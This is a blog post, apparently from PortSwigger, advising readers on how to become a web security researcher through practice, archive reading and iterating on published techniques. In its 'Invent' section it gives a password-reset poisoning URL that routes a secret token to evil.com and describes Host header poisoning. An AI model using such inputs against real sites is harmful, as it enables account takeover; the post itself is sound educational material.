<p>Are you interested in pushing hacking techniques beyond the current state of the art and sharing your findings with
    the infosec community? In this post I’ll share some guidance on how to become a web security researcher, shaped by
    the opportunities and pitfalls I’ve experienced while pursuing this path myself.</p>
<h2>What is a web security researcher?</h2>
<p>Web security researchers are people who go beyond using known hacking techniques likes <a
        href= "https://portswigger.net/web-security/sql-injection">SQLi</a> and <a href= "https://portswigger.net/web-security/cross-site-scripting">XSS</a>, and
    discover new threats to websites. These can be innovations that make existing techniques more powerful like this
    approach to <a href="https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018#7"
        target="_blank">local+blind XXE exploitation</a>, or entire new threat classes like <a
        href="https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017#2" target="_blank">Web Cache
        Deception</a>.</p>
<p>It's extremely hard to defend websites against unknown attack techniques, so they can often be used to exploit huge
    numbers of otherwise-secure websites. This means that publishing such discoveries to give websites a chance to patch
    is crucial for the health of the security ecosystem.</p>
<p>Note that some people use the term 'security researcher' more loosely to refer to anyone who works in offensive
    security, even if they're just applying off-the-shelf tools and techniques.</p>
<h2>Breaking stuff for a living</h2>
<p>Most research is about taking existing techniques that bit further, so the first step is to get well acquainted with
    the current state of the art. The fastest way to achieve this is to get a job where you spend most of your time
    applying web hacking techniques. A lot of <a
        href="https://medium.com/@niruragu/so-you-want-to-be-a-security-engineer-d8775976afb7" target="_blank">good
        people</a> have shared&nbsp;<a
        href="https://medium.com/@niruragu/so-you-want-to-be-a-security-engineer-d8775976afb7" target="_blank">detailed
        advice</a> on getting into the security industry, so I’ll keep this section brief.</p>
<p>I recommend a practice-focused approach starting with our <a href="https://portswigger.net/web-security"
        target="_blank">Web Security Academy</a>,&nbsp;moving on to more open ended challenges like my own <a
        href="https://hackxor.net/" target="_blank">hackxor.net</a>, advancing through soft, low-reward targets on <a
        href="https://hackerone.com/" target="_blank">HackerOne</a> and <a href="https://bugcrowd.com/"
        target="_blank">BugCrowd</a>, and then finally onto well established high-payout bounty programs. Once you have
    a few publicly disclosed vulnerabilities it should be pretty easy to join a security consultancy and spend every day
    hacking stuff. That said, bug bounty hunting isn't for everyone so we've launched the <a
        href="https://portswigger.net/web-security/certification" target="_blank">Burp Suite Certified Practitioner</a>
    certification as an alternative way to prove your skills and get that full-time hacking job.</p>
<p>There are plenty of free online resources to help you on the way, including our <a
        href="https://portswigger.net/web-security" target="_blank">Web Security Academy</a>, HackerOne's&nbsp;<a
        href="https://www.hackerone.com/hacker101" target="_blank">Hacker101</a>,&nbsp;and the&nbsp;<a
        href="https://owasp.org/www-project-web-security-testing-guide/stable/" target="_blank">OWASP testing guide</a>.
    As for books, I’d recommend reading the <a
        href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting-ebook/dp/B005LVQA9S"
        target="_blank">WebApp Hacker’s Handbook</a>, and <a href="https://nostarch.com/tangledweb" target="_blank">The
        Tangled Web</a>. The aforementioned Web Security Academy is intended to be an actively maintained, interactive
    replacement to the WebApp Hacker's Handbook, but it'll take us some time to cover all relevant topics, so for now
    I'd recommend using both.</p>
<h2>Moving beyond known techniques</h2>
<p>Once you start working full time breaking stuff, you’ll initially learn loads but after a while your technical
    expertise will plateau unless you make a concerted effort to keep learning. Refusing to let yourself stop at this
    barrier is the single most important step to becoming a web security researcher.</p>
<h3 id="forgottenknowledge">Hunt forgotten knowledge</h3>
<p>Everyone knows you’re meant to keep up with new developments by monitoring <a
        href="https://twitter.com/albinowax/following" target="_blank">industry experts</a>, <a
        href="https://www.reddit.com/r/netsec/" target="_blank">news aggregates</a> and security conferences. I even run
    a subreddit for this purpose: <a href="https://www.reddit.com/r/websecurityresearch"
        target="_blank">r/websecurityresearch</a>. However, to exclusively follow new developments is to overlook a
    treasure trove of forgotten and overlooked research.&nbsp;</p>
<p>Every time you read a good quality blog post, <span class="bold">read the entire archive</span>. This will often
    unveil invaluable, forgotten tidbits of information. For example, take <a
        href="https://web.archive.org/web/20110403015721/http://ha.ckers.org:80/blog/20091201/dns-rebinding-video/"
        target="_blank">this post</a> by RSnake about DNS rebinding written in 2009. DNS rebinding completely bypasses
    IP/firewall based <a href= "https://portswigger.net/web-security/access-control">access controls</a> on websites, and the only effective way
    to mitigate it is by making your application whitelist the HTTP Host header. And yet at the time, people quickly
    assumed it was mitigated by browsers; this forgotten vulnerability only re-entered common awareness with a string of
    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1524" target="_blank">exploits</a> nine years
    later.</p>
<p>Perusing archives will also help you avoid wasting time replicating work that’s already been done by someone else,
    such as <a href="https://twitter.com/LiveOverflow/status/967122565058715648" target="_blank">re-inventing</a> a CSS
    attack one decade later. That said, some research is genuinely hard to find so occasional duplication is inevitable.
    I've had a published technique collision with one researcher only for both of us to discover that kuza55 had done
    the same thing five years prior. So, do your best to avoid duplicating research but if it happens anyway don’t panic
    - it happens to all of us.</p>
<h3 id="diversity">Collect diversity</h3>
<p>To connect threads and spot opportunities that other people miss, it’s crucial to collect information from a range of
    different sources. For a start, don’t limit yourself to reading security content - you’ll quickly find <a
        href="http://blog.portswigger.net/2015/08/server-side-template-injection.html#FreeMarker"
        target="_blank">documentation</a> can also serve as an exploit construction manual. Again, and this may be
    pretty obvious, but as well as trying to solve problems by Googling and posing <a
        href="https://www.corelan.be/index.php/2015/10/13/how-to-become-a-pentester/" target="_blank">well phrased
        questions</a> to X/Reddit/StackOverflow, ensure you ask colleagues - there’s a huge amount of knowledge floating
    around the community that people haven’t opted to share publicly.</p>
<p>Beyond that, try to ensure your own experiences are diverse too.</p>
<p>Doing black-box pentests for a security consultancy should expose you to a broad range of external and internal web
    applications, the likes of which you’ll rarely encounter in a bug bounty program. But the time constraints will rob
    you of the chance to understand an application with the familiarity that comes from months of bug bounty hunting
    with a single target. And although it’s often slow and constrained, white-box source code reviews can offer an
    irreplaceable alternative perspective, prompting attacks a black-box tester would never conceive. To nurture
    research, you ideally want a healthy mix of all three. Further experiences like playing CTFs and coding web
    applications can also add useful perspectives.</p>
<h3>No idea is too stupid</h3>
<p>One of the worst traps to fall into is dooming a great idea by assuming it won’t work and not trying it, because
    “someone else would have noticed it already” or “that is too dumb to work”. I’ve definitely fallen for this one
    before - one piece of research arrived two years later than it should have done thanks to such a mistake. Whether
    it's <a href="https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/"
        target="_blank">bypassing authentication</a> by trying to login with the same password repeatedly, or&nbsp;<a
        href="https://medium.com/bugbountywriteup/bypassing-googles-fix-to-access-their-internal-admin-panels-12acd3d821e3"
        target="_blank">breaking into</a> a Google administration page by switching from your laptop to your phone, the
    path to your next great exploit may well require a really stupid idea.</p>
<h3 id="abandon">Abandon comfort</h3>
<p>If a technique has a reputation for being difficult, fiddly, or dangerous, that's a topic in dire need of further
    research. After repeatedly experiencing breakthroughs due to being pressured into exploring topics well outside my
    comfort zone, I've decided that the fastest route to novel findings is actively seeking out topics that make you
    uncomfortable. Chances are, these topics are avoided by other hackers, giving them serious research potential. To
    me, this is the only plausible explanation for why I was able to take a technique first documented in 2005, and
    presented again at DEF CON in 2016, and use it to earn <a
        href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn" target="_blank">$70k in
        bounties</a> in 2019.</p>
<h2>Iterate, invent, share</h2>
<h3 id="iterate">Iterate</h3>
<p>The easiest way to get started is to find some promising research by someone else, build on it by mixing in other
    techniques, then apply your new approach to some live targets to see if anything interesting happens</p>
<p>For example, this <a href="https://ejj.io/misconfigured-cors/index.html" target="_blank">post</a> on <a
        href= "https://portswigger.net/web-security/cors">CORS</a> misconfigurations pointed out an interesting behaviour and suggested that
    this behaviour was prevalent, but stopped short of exploring the impact on individual websites.</p>
<p>I took this concept and applied it to bug bounty websites where I could legally explore the impact and try my hand at
    evading any mitigations they might have. Along the way I made some enhancements using common open redirect exploit
    techniques, discovered the ‘null’ origin technique by reading the CORS spec, and explored cache poisoning
    possibilities. </p>
<p>Nothing in this process required sudden leaps of intuition or outstanding technical knowledge, and yet the final
    product - <a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"
        target="_blank">Exploiting CORS misconfigurations for Bitcoins and bounties</a> -&nbsp;was easily as well
    received as flashier efforts.</p>
<h3 id="invent">Invent</h3>
<p>Iterating on other people’s work is great, but the best research often seems to appear out of nowhere, be it <a
        href="http://www.thespanner.co.uk/2014/03/21/rpo/" target="_blank">Relative Path Overwrite</a> or <a
        href="https://omergil.blogspot.co.uk/2017/02/web-cache-deception-attack.html" target="_blank">Web Cache
        Deception</a>. My view is that such discoveries are caused by personal experiences that act as hints. I refer to
    these as leads or breadcrumbs as they’re often cryptic and it may take quite a few of them to guide you all the way
    to a useful discovery.</p>
<p>For example, in 2011 I was trying to crack the <a href= "https://portswigger.net/web-security/csrf">CSRF</a> protection used by
    addons.mozilla.org. I had bypassed the token check, but they also validated that the host in the Referer header
    matched the current site. I asked for help on the sla.ckers forum, and ‘barbarianbob’ spotted that Django determines
    the current site’s host by looking at the HTTP Host header, and this could be overridden with the X-Forwarded-Host
    header. This could be combined with a Flash header injection vulnerability to bypass the CSRF check, but more
    importantly it was the first breadcrumb - it hinted that applications may rely on the host header to know their
    current location.</p>
<p>A while later, I took a look at the source code of Piwik’s password reset function and found a line that looked
    something like:</p>
<p><code>$passwordResetLink = getCurrentUrlWithoutQueryString() + $secretToken</code></p>
<p>Aha, I thought. Piwik uses PHP which has hilarious path handling, so I can request a password reset at
    <code>http://piwik.com/reset.php/foo;http://evil.com</code> resulting in an email with two links, and the secret
    token being sent to evil.com. This idea worked, got me a bounty, and laid the foundation for the subsequent finding.
</p>
<p>The third and final crumb was the the way Piwik tried to patch this vulnerability - they replaced
    <code>getCurrentUrlWithoutQueryString()</code> with <code>getCurrentUrlWithoutFileName()</code>. This meant that I
    couldn’t use the path for an exploit anymore. Thanks to the encounter with Django earlier, I decided to dig further
    into the code to find how Piwik determined what the current host name was, and discovered that like Django, they
    used the HTTP host header, meaning I could easily generate poisoned password reset emails. As it turned out, this
    technique worked on addons.mozilla.org too, and Gallery, and Symfony, and Drupal, and a whole host of other sites,
    finally leading to <a href="https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html"
        target="_blank">Practical HTTP Host Header Attacks</a>.</p>
<p>By spelling out the discovery process in such a verbose way, I’ve hopefully demystified the research and made it look
    less like an idea spontaneously appearing out of the blue. Viewed from this perspective, it looks like the core
    skill (beyond pre-existing knowledge and breadth of experience) lies in recognising these breadcrumbs and
    persistently chasing after them. I can’t quite articulate how to do this yet, but I do know to treat as a lead
    anything that makes you say “this makes no sense”.</p>
<h3 id="share">Share</h3>
<p>Finally, it’s crucial to share your research with the community. This will help increase your profile and perhaps
    persuade your employer to allocate you some more research time. Beyond that, it will help you avoid wasting time and
    spur further research - commenters are really good at pointing out prior work you had no idea existed, and there’s
    nothing more rewarding than seeing another researcher building on your ideas.</p>
<p>Please don’t think a technique or idea isn’t worth sharing just because you don’t have ground-breaking discovery, two
    logos and a presentation - just post whatever you have (ideally on a blog and not just some poorly indexed
    locked-down platform like X/Twitter). X is good for promoting research, but not everyone is on there I'd recommend
    also using alternative channels like <a href="https://www.reddit.com/r/websecurityresearch/"
        target="_blank">r/websecurityresearch</a>.</p>
<p>When sharing research, it’s always helpful to show at least one example of your technique being applied to exploit a
    real application. Without this, people will inevitably have difficulty understanding it, and may doubt that it has
    any practical value.</p>
<p>Finally, presentations are great for reaching a wider audience, but beware of getting caught up in the infosec <span
        class="strikethrough">circus</span>&nbsp;circuit and spending your days repeating past presentations.&nbsp;</p>
<h2>Conclusion</h2>
<p>I have a lot more to learn about web security research myself, so I hope to revisit this topic in a few years with
    substantially more of a clue. Also, I expect other researchers have different perspectives, and look forward to
    learning from any insights they decide to share.</p>
